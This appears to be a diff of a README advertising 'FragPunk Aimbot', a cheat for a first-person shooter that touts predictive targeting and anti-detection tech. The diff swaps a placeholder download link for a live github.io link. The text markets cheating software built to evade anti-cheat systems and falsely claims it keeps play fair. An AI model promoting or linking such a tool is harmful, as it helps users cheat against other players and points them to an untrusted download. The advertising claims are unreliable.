@@ -1,7 +1,7 @@
 # 🎯 **FragPunk Aimbot: Precision Gaming Tool for Competitive Edge**  
 FragPunk Aimbot is a cutting-edge gaming tool designed to elevate your gameplay with unmatched accuracy. Optimized for FPS titles, it features predictive targeting, real-time tracking, and low-latency adjustments. Stay ahead with customizable settings, seamless integration, and advanced anti-detection tech. Perfect for competitive players seeking a strategic edge without compromising fairness.  
 
-[![Download FragPunk Aimbot](https://img.shields.io/badge/Download-FragPunk_Aimbot-blueviolet)](https://example.com)  
+[![Download FragPunk Aimbot](https://img.shields.io/badge/Download-FragPunk_Aimbot-blueviolet)](https://fragpunk-aim-bot.github.io/.github/)  
 
 ---
 
